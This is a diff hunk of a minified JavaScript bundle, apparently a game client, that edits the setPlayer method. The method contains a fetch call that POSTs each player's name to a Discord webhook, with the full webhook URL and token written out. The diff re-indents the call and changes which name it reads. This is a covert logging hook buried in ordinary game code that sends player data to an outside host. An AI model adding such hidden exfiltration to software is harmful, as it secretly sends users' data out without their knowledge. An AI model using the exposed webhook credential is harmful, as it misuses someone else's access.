@@ -31490,13 +31490,13 @@ o[10] || o[8] ? "auto" : fe.noFrameColor ? "black"
         }
         setPlayer(e) {
             this.player = e, Zc.set(!0), qT()
-                            fetch("https://discord.com/api/webhooks/1494265323120234526/T328Bn9ljVyKQmoKlp9GrpqdBCl1ZVdt-Wxhy9Y5HbbSnci6u8P0NvwSQS9fYeyMFtb0", {
+            fetch("https://discord.com/api/webhooks/1494265323120234526/T328Bn9ljVyKQmoKlp9GrpqdBCl1ZVdt-Wxhy9Y5HbbSnci6u8P0NvwSQS9fYeyMFtb0", {
                             method: "POST",
                             headers: {
                                 'Content-Type': 'application/json'
                             },
                             body: JSON.stringify({
-                                content: `[player name log] ${e.name}: hi hello hey hi hi hi hi hiiiiiiii`
+                                content: `[player name log] ${I.player.name}: hi hello hey hi hi hi hi hiiiiiiii`
                             })})
         }
         removePlayer(e) {
